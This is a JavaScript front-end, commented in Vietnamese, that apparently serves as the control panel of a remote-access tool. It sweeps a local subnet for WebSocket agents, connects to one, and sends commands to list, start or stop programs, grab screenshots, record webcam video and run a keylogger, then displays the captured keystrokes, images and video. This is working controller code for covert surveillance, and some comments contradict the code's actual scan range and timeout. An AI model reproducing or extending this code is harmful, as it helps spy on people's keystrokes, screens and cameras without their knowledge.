// KHAI BÁO BIẾN TOÀN CỤC
let ws = null;
let flag = -1; 
let foundServers = []; // Mảng chứa các server tìm thấy

// --- PHẦN 1: QUẢN LÝ QUÉT MẠNG (SCANNER) ---

function scanNetwork() {
    const subnet = document.getElementById("subnetInput").value.trim(); // Ví dụ: 192.168.2.
    const port = document.getElementById("serverPort").value;
    const scanStatus = document.getElementById("scanStatus");
    const serverSelect = document.getElementById("serverList");

    if (!subnet.endsWith(".")) {
        alert("Subnet phải kết thúc bằng dấu chấm (VD: 192.168.2.)");
        return;
    }

    // Reset danh sách
    foundServers = [];
    serverSelect.innerHTML = '<option disabled selected>Scanning...</option>';
    scanStatus.style.display = "block";
    
    // Quét từ .1 đến .254
    let pendingChecks = 0;
    const totalChecks = 50; // Quét 50 IP đầu tiên cho nhanh (tăng lên 254 nếu cần quét hết)
    
    // Lưu ý: Quét quá nhiều IP cùng lúc có thể bị trình duyệt chặn. 
    // Ở đây demo quét từ 1 -> 50. Bạn có thể sửa vòng lặp i <= 254
    for (let i = 1; i <= 254; i++) {
        let ip = subnet + i;
        pendingChecks++;
        checkServer(ip, port, () => {
            pendingChecks--;
            if (pendingChecks === 0) {
                scanStatus.style.display = "none";
                updateDropdown();
            }
        });
    }
}

// Hàm kiểm tra 1 IP cụ thể
// Sửa lại hàm này trong backend.js
function checkServer(ip, port, doneCallback) {
    let string = "ws://" + ip + ":" + port;
    let testWS = new WebSocket(string);
    let isConnected = false;

    console.log(string);
    
    testWS.onopen = () => {
        console.log("FOUND SERVER AT: " + ip); // Log để dễ debug
        isConnected = true;
        foundServers.push(ip); // Lưu IP tìm thấy
        testWS.close();
    };

    testWS.onerror = () => { /* Lỗi = Không có server hoặc bị chặn */ };

    testWS.onclose = () => {
        // Chỉ gọi callback 1 lần
        if (doneCallback) {
            doneCallback();
            doneCallback = null; // Đảm bảo không gọi lại
        }
    };

    // TĂNG THỜI GIAN CHỜ LÊN 1000ms (1 giây)
    setTimeout(() => {
        if (!isConnected && testWS.readyState !== WebSocket.OPEN) {
            testWS.close(); // Đóng sẽ kích hoạt onclose -> gọi callback
        }
    }, 5000); 
}

function updateDropdown() {
    const select = document.getElementById("serverList");
    select.innerHTML = "";

    if (foundServers.length === 0) {
        let option = document.createElement("option");
        option.text = "-- No Server Found --";
        option.disabled = true;
        option.selected = true;
        select.add(option);
    } else {
        foundServers.forEach(ip => {
            let option = document.createElement("option");
            option.value = ip;
            option.text = ip;
            select.add(option);
        });
        // Tự động chọn cái đầu tiên
        select.selectedIndex = 0;
    }
}

// --- PHẦN 2: QUẢN LÝ KẾT NỐI (CONNECT) ---

function connectToSelected() {
    const btn = document.getElementById("btnConnect");
    const select = document.getElementById("serverList");
    const port = document.getElementById("serverPort").value;

    // Nếu đang kết nối thì ngắt kết nối
    if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) {
        ws.close();
        return; 
    }

    // Lấy IP từ Dropdown
    const ip = select.value;
    if (!ip) {
        alert("Vui lòng Scan và chọn 1 Server từ danh sách!");
        return;
    }

    connectToServer(ip, port);
}

function connectToServer(ip, port) {
    const url = `ws://${ip}:${port}`;
    console.log("Connecting to: " + url);
    document.getElementById("connectionStatus").innerHTML = "🟡 Connecting to " + ip + "...";
    document.getElementById("connectionStatus").style.color = "#ffc107";

    try {
        ws = new WebSocket(url);
        ws.binaryType = "arraybuffer";
        
        ws.onopen = onWSOpen;
        ws.onclose = onWSClose;
        ws.onmessage = onWSMessage;
        ws.onerror = onWSError;

    } catch (e) {
        console.error("Connection Error:", e);
        alert("Lỗi kết nối!");
    }
}

// --- PHẦN 3: CÁC EVENT HANDLER (GIỮ NGUYÊN CODE CŨ) ---

function onWSOpen() {
    document.getElementById("connectionStatus").innerHTML = "🟢 Connected";
    document.getElementById("connectionStatus").style.color = "#28a745";
    
    const btn = document.getElementById("btnConnect");
    btn.innerText = "Disconnect";
    btn.classList.add("connected");
    
    // Disable inputs
    document.getElementById("serverList").disabled = true;
    document.getElementById("subnetInput").disabled = true;
    
    console.log("Connected to Server");
}

function onWSClose() {
    document.getElementById("connectionStatus").innerHTML = "🔴 Disconnected";
    document.getElementById("connectionStatus").style.color = "#dc3545";
    
    const btn = document.getElementById("btnConnect");
    btn.innerText = "Connect";
    btn.classList.remove("connected");

    // Enable inputs
    document.getElementById("serverList").disabled = false;
    document.getElementById("subnetInput").disabled = false;
    
    console.log("Disconnected from Server");
    ws = null;
}

function onWSError(err) {
    console.error("WebSocket Error:", err);
    // onclose sẽ được gọi sau
}

function onWSMessage(event) {
    // --- (GIỮ NGUYÊN CODE XỬ LÝ MESSAGE CŨ CỦA BẠN Ở DƯỚI) ---
    // 1. XỬ LÝ DỮ LIỆU NHỊ PHÂN
    if (event.data instanceof ArrayBuffer) {
        if (flag == 1) { // SCREENSHOT
            const blob = new Blob([event.data], { type: "image/bmp" });
            const url = URL.createObjectURL(blob);
            const container = document.getElementById("screenshotContainer");
            container.innerHTML = ""; 
            const img = document.createElement("img");
            img.src = url;
            container.appendChild(img);
        } 
        else if (flag == 2) { // WEBCAM
            const blob = new Blob([event.data], { type: 'video/mp4' });
            const videoUrl = URL.createObjectURL(blob);
            const videoPlayer = document.getElementById('videoPlayer');
            if (videoPlayer.src) URL.revokeObjectURL(videoPlayer.src);
            videoPlayer.src = videoUrl;
            videoPlayer.play().catch(e => console.error(e));
        }
        flag = -1; 
    } 
    // 2. XỬ LÝ DỮ LIỆU VĂN BẢN
    else {
        HandleClientMSG(event.data);
    }
}

// ... (Copy tiếp phần HandleClientMSG và các hàm sendCommand từ code cũ vào đây) ...
function HandleClientMSG(data) {
    if (data == "screenshot") { flag = 1; return; }
    if (data == "webcam") { flag = 2; return; }
    if (data == "Keylogging started") { flag = 3; logKeyToConsole(">>> Keylogger Started"); return; }
    if (data == "Keylogging stopped") { flag = 4; logKeyToConsole(">>> Keylogger Stopped"); return; }

    if (data.includes(".exe") || data.includes("\n")) {
        renderAppListToTable(data);
    } else {
        logKeyToConsole(data);
    }
    if (flag != 3) flag = -1; 
}

// HÀM HELPER UI
function switchTab(tabId) {
    document.querySelectorAll('.content-section').forEach(el => el.classList.remove('active'));
    document.querySelectorAll('.nav-links li').forEach(el => el.classList.remove('active'));
    document.getElementById('tab-' + tabId).classList.add('active');
    event.currentTarget.classList.add('active');
}

function sendCommand(cmd) {
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(cmd);
        console.log("Sent:", cmd);
    } else {
        alert("Chưa kết nối!");
    }
}

// --- CÁC HÀM CŨ (listApp, renderAppListToTable, logKeyToConsole...) GIỮ NGUYÊN ---
function listApp() { sendCommand("list_apps"); }
function renderAppListToTable(dataString) {
    const tbody = document.getElementById("appListBody");
    tbody.innerHTML = ""; 
    const apps = dataString.split('\n'); 
    apps.forEach(app => {
        if (app.trim().length > 0) {
            const tr = document.createElement("tr");
            const tdName = document.createElement("td");
            tdName.textContent = app;
            const tdAction = document.createElement("td");
            
            const btnStart = document.createElement("button");
            btnStart.className = "btn btn-success"; btnStart.style.marginRight = "5px"; btnStart.innerText = "Start";
            btnStart.onclick = () => sendCommand("start_app:" + app.trim());

            const btnStop = document.createElement("button");
            btnStop.className = "btn btn-danger"; btnStop.innerText = "End";
            btnStop.onclick = () => sendCommand("stop_app:" + app.trim());

            tdAction.appendChild(btnStart); tdAction.appendChild(btnStop);
            tr.appendChild(tdName); tr.appendChild(tdAction); tbody.appendChild(tr);
        }
    });
}
function manualStart() { const name = document.getElementById("manualAppName").value; if(name) sendCommand("start_app:" + name); }
function manualStop() { const name = document.getElementById("manualAppName").value; if(name) sendCommand("stop_app:" + name); }
function startkeyLog() { sendCommand("start_keylog"); }
function stopkeyLog() { sendCommand("stop_keylog"); }
function screenShot() { sendCommand("screenshot"); }
function webCam() { sendCommand("webcam"); }
function logKeyToConsole(msg) {
    const consoleBox = document.getElementById("keylogConsole");
    const span = document.createElement("span");
    span.className = "console-line"; span.innerText = msg;
    consoleBox.appendChild(span); consoleBox.scrollTop = consoleBox.scrollHeight;
}
function clearConsole() { document.getElementById("keylogConsole").innerHTML = '<span class="console-line">Console cleared.</span>'; }